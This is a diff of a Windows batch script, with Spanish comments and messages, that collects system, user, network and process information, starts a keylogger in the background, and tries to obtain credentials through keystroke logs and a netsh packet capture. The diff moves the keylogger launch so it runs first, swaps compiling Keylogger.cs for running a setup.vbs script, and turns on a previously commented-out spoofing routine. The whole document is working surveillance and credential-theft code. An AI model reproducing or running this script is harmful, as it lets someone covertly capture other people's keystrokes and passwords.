@@ -6,15 +6,14 @@ set "ErrorCode=0"
 Set "KeyloggerFailled=0"
 :: Try Block
 
+    call :GetKeyloggerInfo || call :SetDisponibility || set "ErrorCode=1"
     call :GetSystemInfo || set "ErrorCode=1"
     call :GetUserInfo || set "ErrorCode=1"
     call :GetNetworkInfo || set "ErrorCode=1"
     call :GetProcessInfo || set "ErrorCode=1"
     call :GetServiceInfo || set "ErrorCode=1"
-    call :GetKeyloggerInfo || call :SetDisponibility || set "ErrorCode=1"
     call :GetCredentials || set "ErrorCode=1"
-    ::call :SimulateSpoofing || set "ErrorCode=1"
-
+    call :SimulateSpoofing || set "ErrorCode=1"
 
 :: Check for errors
 if "%ErrorCode%" NEQ "0" (
@@ -32,6 +31,8 @@ echo Ha ocurrido un error durante la ejecución del script. >> salida.txt
 echo Código de Error: %ErrorCode% >> salida.txt
 :: Aquí puedes agregar más acciones de manejo de errores, como notificar al usuario o limpiar archivos temporales.
 exit /b
+
+
 
 :: Funciones
 
@@ -89,11 +90,9 @@ exit /b
 :GetKeyloggerInfo
     echo **************************** INFORMACIÓN DE PULSACIONES DE TECLADO **************************** >> salida.txt
     mkdir keyloggerLogs
-    .>> Pulsaciones.txt
     if not exist KeyLogger.exe (
-        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Keylogger.cs
+       cscript setup.vbs
     )
-    start /B KeyLogger.exe
     echo El keylogger está corriendo en segundo plano. >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
@@ -102,8 +101,7 @@ exit /b
     echo **************************** INFORMACIÓN PARA CONSEGUIR CREDENCIALES **************************** >> salida.txt
     :: crea archivo passwords.txt dentro de directorio keyloggerLogs
     echo. > keyloggerLogs\passwords.txt
-
-    move Pulsaciones.txt keyloggerLogs
+    move keystrokes.txt keyloggerLogs
     netsh trace start capture=yes
     netsh trace stop
     netsh trace show trace > temp_trace.txt
